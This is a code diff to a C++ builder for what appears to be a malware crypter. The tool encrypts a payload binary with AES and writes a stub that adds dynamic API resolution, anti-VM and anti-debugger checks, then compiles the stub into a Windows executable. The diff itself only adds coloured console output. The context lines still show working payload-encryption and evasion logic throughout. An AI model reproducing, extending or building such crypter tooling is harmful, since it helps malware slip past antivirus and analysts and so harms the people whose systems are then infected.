@@ -296,7 +296,7 @@ string generateRandomString(size_t length) {
 vector<unsigned char> readBinary(string &path_to_payload) {
     ifstream file(path_to_payload, ios::binary | ios::ate);
     if (!file) {
-        cerr << "Could not open binary\n";
+        cerr << "\033[31mCould not open binary\n\033[0m";
         return {};
     }
 
@@ -305,7 +305,7 @@ vector<unsigned char> readBinary(string &path_to_payload) {
 
     vector<char> buf(len);
     if (!file.read(buf.data(), len)) {
-        std::cerr << "Error reading binary\n";
+        std::cerr << "\033[31mError reading binary\n\033[0m";
         return {};
     }
 
@@ -322,7 +322,7 @@ pair <vector<unsigned char>, vector<unsigned char>> generateKeyAndIV(size_t keyS
     vector<unsigned char> iv(ivSize);
     
     if (!RAND_bytes(key.data(), keySize) || !RAND_bytes(iv.data(), ivSize)) {
-        cerr << "error generating key and IV\n";
+        cerr << "\033[31merror generating key and IV\n\033[0m";
         exit(1);
     }
 
@@ -334,12 +334,12 @@ vector<unsigned char> encrypt(const vector<unsigned char> &buf, const vector<uns
     EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
     
     if (!ctx) {
-        cerr << "Encryption CTX error\n";
+        cerr << "\033[31mEncryption CTX error\n\033[0m";
         exit(1);
     }
 
     if (EVP_EncryptInit_ex(ctx, EVP_aes_128_cfb8(), NULL, key.data(), iv.data()) != 1) {
-        cerr << "Encryption error\n";
+        cerr << "\033[31mEncryption error\n\033[0m";
         EVP_CIPHER_CTX_free(ctx);
         exit(1);
     }
@@ -348,7 +348,7 @@ vector<unsigned char> encrypt(const vector<unsigned char> &buf, const vector<uns
     int len;
 
     if (EVP_EncryptUpdate(ctx, ciphertext.data(), &len, buf.data(), buf.size()) != 1) {
-        cerr << "Encryption failed\n";
+        cerr << "\033[31mEncryption failed\n\033[0m";
         EVP_CIPHER_CTX_free(ctx);
         exit(1);
     }
@@ -362,12 +362,12 @@ vector<unsigned char> encrypt(const vector<unsigned char> &buf, const vector<uns
 vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
     EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
     if (!ctx) {
-        cerr << "Decryption CTX error\n";
+        cerr << "\033[31mDecryption CTX error\n\033[0m";
         exit(1);
     }
 
     if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cfb8(), NULL, key.data(), iv.data()) != 1) {
-        cerr << "Decryption error\n";
+        cerr << "\033[31mDecryption error\n\033[0m";
         EVP_CIPHER_CTX_free(ctx);
         exit(1);
     }
@@ -376,7 +376,7 @@ vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<uns
     int len;
 
     if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, buf.data(), buf.size()) != 1) {
-        cerr << "decryption failed\n";
+        cerr << "\033[31mdecryption failed\n\033[0m";
         EVP_CIPHER_CTX_free(ctx);
         exit(1);
     }
@@ -390,7 +390,7 @@ vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<uns
 void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, const vector<unsigned char> &payloadBytes, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
     ifstream file(stubTemplatePath);
     if (!file) {
-        cerr << "Could not open stub template\n";
+        cerr << "\033[31mCould not open stub template\n\033[0m";
         return;
     }
     
@@ -400,7 +400,7 @@ void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, con
 
     ofstream outputFile(outputPath);
     if (!outputFile) {
-        cerr << "Could not create stub output\n";
+        cerr << "\033[31mCould not create stub output\n\033[0m";
         return;
     }
 
@@ -437,7 +437,7 @@ void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, con
                 line.replace(pos, strlen("/*DYN_RESOLUTION*/"), DYN_RESOLUTION);
             }
 
-            cout << "\nset dynamic api resolution\n";
+            cout << "\n\033[32mset dynamic api resolution successfully\n\033[0m";
             flags[DYN] = false;
         }
 
@@ -454,7 +454,7 @@ void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, con
                 line.replace(pos, strlen("execute(payload);"), RAND_CALL);
             }
             
-            cout << "\nset randomizaton\n";
+            cout << "\n\033[32mset randomizaton successfully\n\033[0m";
             flags[RAND] = false;
         }
         
@@ -466,7 +466,7 @@ void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, con
                 line.replace(pos, strlen("/*VM_CALL*/"), "antiVm();");
             }
 
-            cout << "\nset antiVM\n";
+            cout << "\n\033[32mset antiVM successfully\n\033[0m";
             flags[VM] = false;
         }
 
@@ -478,7 +478,7 @@ void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, con
                 line.replace(pos, strlen("/*DB_CALL*/"), "antiDb();");
             }
 
-            cout << "\nset antiDB\n";
+            cout << "\n\033[32mset antiDB successfully\n\033[0m";
             flags[DB] = false;
         }
 
@@ -488,19 +488,19 @@ void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, con
     file.close();
     outputFile.close();
 
-    cout << "\nSuccessfully wrote stub to: " << outputPath << "\n";
+    cout << "\n\033[32mSuccessfully wrote stub to: " << outputPath << "\n\033[0m";
 
     if(flags[COMPILE] == true){
-        cout << "\ncompiling stub...\n";
+        cout << "\n\033[33mcompiling stub...\n\033[0m";
         string tmp = "make out/stub_" + name + ".exe";
         const char *command = tmp.c_str();
 
         int out = system(command);
         if(out == 0){
-            cout << "\ncompilation successful\n";
-            cout << "->\t/out/stub_" << name << ".exe\n";
+            cout << "\n\033[32mcompilation successful\n";
+            cout << "->\t/out/stub_" << name << ".exe\n\033[0m";
         } else {
-            cerr << "\ncompilation failed\n";
+            cerr << "\n\033[31mcompilation failed\n\033[0m";
         }
 
     }
